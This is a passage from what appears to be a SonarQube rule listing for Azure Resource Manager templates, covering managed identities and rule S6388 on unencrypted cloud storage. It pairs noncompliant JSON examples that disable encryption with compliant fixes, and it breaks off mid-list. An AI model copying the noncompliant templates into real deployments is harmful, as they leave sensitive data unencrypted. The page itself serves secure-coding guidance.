configuration faults may also happen when storing these values or assigning them permissions.</p>
<p>By transparently taking care of the Azure Active Directory authentication, Managed Identities allow getting rid of day-to-day credentials
management.</p>
<h2>Ask Yourself Whether</h2>
<p>The resource:</p>
<ul><li> Needs to authenticate to Azure resources that support Azure Active Directory (AAD). </li><li> Uses a different Access Control system that doesn’t guarantee the same security controls as AAD, or no Access Control system at all. </li></ul>
<p>There is a risk if you answered yes to all of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable the Managed Identities capabilities of this Azure resource. If supported, use a System-Assigned managed identity, as:</p>
<ul><li> It cannot be shared across resources. </li><li> Its life cycle is deeply tied to the life cycle of its Azure resource. </li><li> It provides a unique independent identity. </li></ul>
<p>Alternatively, User-Assigned Managed Identities can also be used but don’t guarantee the properties listed above.</p>
<h2>Sensitive Code Example</h2>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.ApiManagement/service&#34;,
            &#34;apiVersion&#34;: &#34;2022-09-01-preview&#34;,
            &#34;name&#34;: &#34;apiManagementService&#34;,
        }
    ]
}
</pre>
<h2>Compliant Solution</h2>
<pre data-diff-id="1" data-diff-type="compliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.ApiManagement/service&#34;,
            &#34;apiVersion&#34;: &#34;2022-09-01-preview&#34;,
            &#34;name&#34;: &#34;apiManagementService&#34;,
            &#34;identity&#34;: {
                &#34;type&#34;: &#34;SystemAssigned&#34;
            }
        }
    ]
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A05</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A06</a> - Security
  Misconfiguration </li><li> <a href="https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview" rel="nofollow">Azure AD Documentation - Managed
  Identities Overview</a> </li><li> <a href="https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/managed-identity-best-practice-recommendations" rel="nofollow">Azure AD Documentation - Managed Identities Best Practices</a> </li><li> <a href="https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/services-support-managed-identities" rel="nofollow">Azure
  AD Documentation - Services that support managed identities</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6388">
              azureresourcemanager:S6388
            </a>
          </td>
          <td>
            <details>
              <p>Using unencrypted cloud storages can lead to data exposure. In the case that adversaries gain physical access to the storage medium they are able
to access unencrypted information.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The service contains sensitive information that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt cloud storages that contain sensitive information.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.azurearcdata/sqlserverinstances/databases" rel="nofollow">Microsoft.AzureArcData/sqlServerInstances/databases</a>:</p>
<p>Disabled encryption on SQL service instance database:</p>
<pre data-diff-id="1201" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.AzureArcData/sqlServerInstances/databases&#34;,
      &#34;apiVersion&#34;: &#34;2023-03-15-preview&#34;,
      &#34;properties&#34;: {
        &#34;databaseOptions&#34;: {
          &#34;isEncrypted&#34;: false
        }
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/snapshots" rel="nofollow">Microsoft.Compute/snapshots</a>:</p>
<p>Disabled disk encryption with settings collection:</p>
<pre data-diff-id="402" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/snapshots&#34;,
      &#34;apiVersion&#34;: &#34;2022-07-02&#34;,
      &#34;properties&#34;: {
        &#34;encryptionSettingsCollection&#34;: {
          &#34;enabled&#34;: false
        }
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/virtualmachines" rel="nofollow">Microsoft.Compute/virtualMachines</a>:</p>
<p>Disabled encryption at host level:</p>
<pre data-diff-id="101" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/virtualMachines&#34;,
      &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
      &#34;properties&#34;: {
        &#34;securityProfile&#34;: {
          &#34;encryptionAtHost&#34;: false
        }
      }
    }
  ]
}
</pre>
<p>Disabled encryption for managed disk:</p>
<pre data-diff-id="102" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/virtualMachines&#34;,
      &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
      &#34;properties&#34;: {
        &#34;storageProfile&#34;: {
          &#34;dataDisks&#34;: [
            {
              &#34;id&#34;: &#34;myDiskId&#34;,
            }
          ]
        }
      }
    }
  ]
}
</pre>
<p>Disabled encryption for OS disk:</p>
<pre data-diff-id="104" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/virtualMachines&#34;,
      &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
      &#34;properties&#34;: {
        &#34;storageProfile&#34;: {
          &#34;osDisk&#34;: {
            &#34;encryptionSettings&#34;: {
              &#34;enabled&#34;: false
            }
          }
        }
      }
    }
  ]
}
</pre>
<p>Disabled encryption for OS managed disk:</p>
<pre data-diff-id="105" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/virtualMachines&#34;,
      &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
      &#34;properties&#34;: {
        &#34;storageProfile&#34;: {
          &#34;osDisk&#34;: {
            &#34;managedDisk&#34;: {
              &#34;id&#34;: &#34;myDiskId&#34;,
            }
          }
        }
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/virtualmachinescalesets/virtualmachines" rel="nofollow">Microsoft.Compute/virtualMachineScaleSets</a>:</p>
<p>Disabled encryption at host level:</p>
<pre data-diff-id="201" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/virtualMachines&#34;,
      &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
      &#34;properties&#34;: {
        &#34;virtualMachineProfile&#34;: {
          &#34;securityProfile&#34;: {
            &#34;encryptionAtHost&#34;: false
          }
        }
      }
    }
  ]
}
</pre>
<p>Disabled encryption for data disk:</p>
<pre data-diff-id="202" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/virtualMachineScaleSets&#34;,
      &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
      &#34;properties&#34;: {
        &#34;virtualMachineProfile&#34;: {
          &#34;storageProfile&#34;: {
            &#34;dataDisks&#34;: [
              {
                &#34;name&#34;: &#34;myDataDisk&#34;
              }
            ]
          }
        }
      }
    }
  ]
}
</pre>
<p>Disabled encryption for OS disk:</p>
<pre data-diff-id="204" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/virtualMachineScaleSets&#34;,
      &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
      &#34;properties&#34;: {
        &#34;virtualMachineProfile&#34;: {
          &#34;storageProfile&#34;: {
            &#34;osDisk&#34;: {
              &#34;name&#34;: &#34;myOsDisk&#34;
            }
          }
        }
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.containerservice/managedclusters" rel="nofollow">Microsoft.ContainerService/managedClusters</a>:</p>
<p>Disabled encryption at host and set the disk encryption set ID:</p>
<pre data-diff-id="1101" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.ContainerService/managedClusters&#34;,
      &#34;apiVersion&#34;: &#34;2023-03-02-preview&#34;,
      &#34;properties&#34;: {
        &#34;agentPoolProfiles&#34;: [
          {
            &#34;enableEncryptionAtHost&#34;: false
          }
        ]
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.datalakestore/accounts" rel="nofollow">Microsoft.DataLakeStore/accounts</a>:</p>
<p>Disabled encryption for Data Lake Store:</p>
<pre data-diff-id="501" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.DataLakeStore/accounts&#34;,
      &#34;apiVersion&#34;: &#34;2016-11-01&#34;,
      &#34;properties&#34;: {
        &#34;encryptionState&#34;: &#34;Disabled&#34;
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformysql/servers" rel="nofollow">Microsoft.DBforMySQL/servers</a>:</p>
<p>Disabled infrastructure double encryption for MySQL server:</p>
<pre data-diff-id="601" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.DBforMySQL/servers&#34;,
      &#34;apiVersion&#34;: &#34;2017-12-01&#34;,
      &#34;properties&#34;: {
        &#34;infrastructureEncryption&#34;: &#34;Disabled&#34;
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbforpostgresql/2017-12-01/servers" rel="nofollow">Microsoft.DBforPostgreSQL/servers</a>:</p>
<p>Disabled infrastructure double encryption for PostgreSQL server:</p>
<pre data-diff-id="701" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.DBforPostgreSQL/servers&#34;,
      &#34;apiVersion&#34;: &#34;2017-12-01&#34;,
      &#34;properties&#34;: {
        &#34;infrastructureEncryption&#34;: &#34;Disabled&#34;
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/fr-fr/azure/templates/microsoft.documentdb/cassandraclusters/datacenters" rel="nofollow">Microsoft.DocumentDB/cassandraClusters/dataCenters</a>:</p>
<p>Disabled encryption for a Cassandra Cluster datacenter’s managed disk and backup:</p>
<pre data-diff-id="901" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.DocumentDB/cassandraClusters/dataCenters&#34;,
      &#34;apiVersion&#34;: &#34;2023-04-15&#34;,
      &#34;properties&#34;: {
        &#34;diskCapacity&#34;: 4
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.hdinsight/clusters" rel="nofollow">Microsoft.HDInsight/clusters</a>:</p>
<p>Disabled encryption for data disk:</p>
<pre data-diff-id="1301" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.HDInsight/clusters&#34;,
      &#34;apiVersion&#34;: &#34;2021-06-01&#34;,
      &#34;properties&#34;: {
        &#34;computeProfile&#34;: {
          &#34;roles&#34;: [
            {
              &#34;encryptDataDisks&#34;: false
            }
          ]
        }
      }
    }
  ]
}
</pre>
<p>Disabled encryption for data disk at application level:</p>
<pre data-diff-id="1302" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.HDInsight/clusters/applications&#34;,
      &#34;apiVersion&#34;: &#34;2021-06-01&#34;,
      &#34;properties&#34;: {
        &#34;computeProfile&#34;: {
          &#34;roles&#34;: [
            {
              &#34;encryptDataDisks&#34;: false
            }
          ]
        }
      }
    }
  ]
}
</pre>
<p>Disabled encryption for resource disk:</p>
<pre data-diff-id="1303" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.HDInsight/clusters&#34;,
      &#34;apiVersion&#34;: &#34;2021-06-01&#34;,
      &#34;properties&#34;: {
        &#34;diskEncryptionProperties&#34;: {
          &#34;encryptionAtHost&#34;: false
        }
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.kusto/clusters" rel="nofollow">Microsoft.Kusto/clusters</a>:</p>
<p>Disabled encryption for disk:</p>
<pre data-diff-id="1401" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Kusto/clusters&#34;,
      &#34;apiVersion&#34;: &#34;2022-12-29&#34;,
      &#34;properties&#34;: {
        &#34;enableDiskEncryption&#34;: false
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.recoveryservices/vaults" rel="nofollow">Microsoft.RecoveryServices/vaults</a>:</p>
<p>Disabled encryption for disk:</p>
<pre data-diff-id="1501" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.RecoveryServices/vaults&#34;,
      &#34;apiVersion&#34;: &#34;2023-01-01&#34;,
      &#34;properties&#34;: {
        &#34;encryption&#34;: {
          &#34;infrastructureEncryption&#34;: &#34;Disabled&#34;
        }
      }
    }
  ]
}
</pre>
<p>Disabled encryption on infastructure for backup:</p>
<pre data-diff-id="1502" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.RecoveryServices/vaults/backupEncryptionConfigs&#34;,
      &#34;apiVersion&#34;: &#34;2023-01-01&#34;,
      &#34;properties&#34;: {
        &#34;infrastructureEncryptionState&#34;: &#34;Disabled&#34;
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.redhatopenshift/openshiftclusters" rel="nofollow">Microsoft.RedHatOpenShift/openShiftClusters</a>:</p>
<p>Disabled disk encryption for master profile and worker profiles:</p>
<pre data-diff-id="1601" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.RedHatOpenShift/openShiftClusters&#34;,
      &#34;apiVersion&#34;: &#34;2022-09-04&#34;,
      &#34;properties&#34;: {
        &#34;masterProfile&#34;: {
          &#34;encryptionAtHost&#34;: &#34;Disabled&#34;
        },
        &#34;workerProfiles&#34;: [
          {
            &#34;encryptionAtHost&#34;: &#34;Disabled&#34;
          }
        ]
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.sqlvirtualmachine/sqlvirtualmachines" rel="nofollow">Microsoft.SqlVirtualMachine/sqlVirtualMachines</a>:</p>
<p>Disabled encryption for SQL Virtual Machine:</p>
<pre data-diff-id="801" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.SqlVirtualMachine/sqlVirtualMachines&#34;,
      &#34;apiVersion&#34;: &#34;2022-08-01-preview&#34;,
      &#34;properties&#34;: {
        &#34;autoBackupSettings&#34;: {
          &#34;enableEncryption&#34;: false
        }
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.storage/storageaccounts" rel="nofollow">Microsoft.Storage/storageAccounts</a>:</p>
<p>Disabled enforcing of infrastructure encryption for double encryption of data:</p>
<pre data-diff-id="1001" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Storage/storageAccounts&#34;,
      &#34;apiVersion&#34;: &#34;2022-09-01&#34;,
      &#34;properties&#34;: {
        &#34;encryption&#34;: {
          &#34;requireInfrastructureEncryption&#34;: false
        }
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.storage/storageaccounts/encryptionscopes?pivots&#61;deployment-language-bicep" rel="nofollow">Microsoft.Storage/storageAccounts/encryptionScopes</a>:</p>
<p>Disabled enforcing of infrastructure encryption for double encryption of data at encryption scope level:</p>
<pre data-diff-id="1002" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Storage/storageAccounts/encryptionScopes&#34;,
      &#34;apiVersion&#34;: &#34;2022-09-01&#34;,
      &#34;properties&#34;: {
        &#34;requireInfrastructureEncryption&#34;: false
      }
    }
  ]
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.azurearcdata/sqlserverinstances/databases" rel="nofollow">Microsoft.AzureArcData/sqlServerInstances/databases</a>:</p>
<p>Enabled encryption on SQL service instance database:</p>
<pre data-diff-id="1201" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.AzureArcData/sqlServerInstances/databases&#34;,
      &#34;apiVersion&#34;: &#34;2023-03-15-preview&#34;,
      &#34;properties&#34;: {
        &#34;databaseOptions&#34;: {
          &#34;isEncrypted&#34;: true
        }
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/disks" rel="nofollow">Microsoft.Compute/disks</a>:</p>
<p>Enabled encryption for managed disk:</p>
<pre data-diff-id="301" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/disks&#34;,
      &#34;apiVersion&#34;: &#34;2022-07-02&#34;,
      &#34;properties&#34;: {
        &#34;encryption&#34;: {
          &#34;diskEncryptionSetId&#34;: &#34;string&#34;,
          &#34;type&#34;: &#34;string&#34;
        }
      }
    }
  ]
}
</pre>
<p>Enabled encryption through setting <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/disks?pivots&#61;deployment-language-arm-template#encryptionsettingscollection-1" rel="nofollow">encryptionSettingsCollection</a>:</p>
<pre data-diff-id="302" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/disks&#34;,
      &#34;apiVersion&#34;: &#34;2022-07-02&#34;,
      &#34;properties&#34;: {
        &#34;encryptionSettingsCollection&#34;: {
          &#34;enabled&#34;: true,
          &#34;encryptionSettings&#34;: [
            {
              &#34;diskEncryptionKey&#34;: {
                &#34;secretUrl&#34;: &#34;string&#34;,
                &#34;sourceVault&#34;: {
                  &#34;id&#34;: &#34;string&#34;
                }
              }
            }
          ]
        }
      }
    }
  ]
}
</pre>
<p>Enabled encryption through a security profile for an OS disk:</p>
<pre data-diff-id="303" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/disks&#34;,
      &#34;apiVersion&#34;: &#34;2022-07-02&#34;,
      &#34;properties&#34;: {
        &#34;securityProfile&#34;: {
          &#34;secureVMDiskEncryptionSetId&#34;: &#34;string&#34;,
          &#34;securityType&#34;: &#34;{&#39;ConfidentialVM_DiskEncryptedWithCustomerKey&#39; | &#39;ConfidentialVM_DiskEncryptedWithPlatformKey&#39; | &#39;ConfidentialVM_VMGuestStateOnlyEncryptedWithPlatformKey&#39; | &#39;TrustedLaunch&#39;}&#34;
        }
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/snapshots" rel="nofollow">Microsoft.Compute/snapshots</a>:</p>
<p>Enabled disk encryption for snapshot:</p>
<pre data-diff-id="401" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/snapshots&#34;,
      &#34;apiVersion&#34;: &#34;2022-07-02&#34;,
      &#34;properties&#34;: {
        &#34;encryption&#34;: {
          &#34;diskEncryptionSetId&#34;: &#34;string&#34;,
          &#34;type&#34;: &#34;{&#39;EncryptionAtRestWithCustomerKey&#39; | &#39;EncryptionAtRestWithPlatformAndCustomerKeys&#39; | &#39;EncryptionAtRestWithPlatformKey&#39;}&#34;
        }
      }
    }
  ]
}
</pre>
<p>Enabled disk encryption with settings collection:</p>
<pre data-diff-id="402" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/snapshots&#34;,
      &#34;apiVersion&#34;: &#34;2022-07-02&#34;,
      &#34;properties&#34;: {
        &#34;encryptionSettingsCollection&#34;: {
          &#34;enabled&#34;: true,
          &#34;encryptionSettings&#34;: [
            {
              &#34;diskEncryptionKey&#34;: {
                &#34;secretUrl&#34;: &#34;&#34;,
                &#34;sourceVault&#34;: {
                  &#34;id&#34;: &#34;string&#34;
                }
              }
            }
          ],
          &#34;encryptionSettingsVersion&#34;: &#34;{&#39;1.0&#39; | &#39;1.1&#39;}&#34;
        }
      }
    }
  ]
}
</pre>
<p>Enabled disk encryption through security profile:</p>
<pre data-diff-id="403" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/snapshots&#34;,
      &#34;apiVersion&#34;: &#34;2022-07-02&#34;,
      &#34;properties&#34;: {
        &#34;securityProfile&#34;: {
          &#34;secureVMDiskEncryptionSetId&#34;: &#34;string&#34;,
          &#34;securityType&#34;: &#34;{&#39;ConfidentialVM_DiskEncryptedWithCustomerKey&#39; | &#39;ConfidentialVM_DiskEncryptedWithPlatformKey&#39; | &#39;ConfidentialVM_VMGuestStateOnlyEncryptedWithPlatformKey&#39; |&#39;TrustedLaunch&#39;}&#34;
        }
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/virtualmachines" rel="nofollow">Microsoft.Compute/virtualMachines</a>:</p>
<p>Enabled encryption at host level:</p>
<pre data-diff-id="101" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/virtualMachines&#34;,
      &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
      &#34;properties&#34;: {
        &#34;securityProfile&#34;: {
          &#34;encryptionAtHost&#34;: true
        }
      }
    }
  ]
}
</pre>
<p>Enabled encryption for managed disk:</p>
<pre data-diff-id="102" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/virtualMachines&#34;,
      &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
      &#34;properties&#34;: {
        &#34;storageProfile&#34;: {
          &#34;dataDisks&#34;: [
            {
              &#34;id&#34;: &#34;myDiskId&#34;,
              &#34;managedDisk&#34;: {
                &#34;diskEncryptionSet&#34;: {
                  &#34;id&#34;: &#34;string&#34;
                }
              }
            }
          ]
        }
      }
    }
  ]
}
</pre>
<p>Enabled encryption for managed disk through security profile:</p>
<pre data-diff-id="103" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/virtualMachines&#34;,
      &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
      &#34;properties&#34;: {
        &#34;storageProfile&#34;: {
          &#34;dataDisks&#34;: [
            {
              &#34;id&#34;: &#34;myDiskId&#34;,
              &#34;managedDisk&#34;: {
                &#34;securityProfile&#34;: {
                  &#34;diskEncryptionSet&#34;: {
                    &#34;id&#34;: &#34;string&#34;
                  }
                }
              }
            }
          ]
        }
      }
    }
  ]
}
</pre>
<p>Enabled encryption for OS disk:</p>
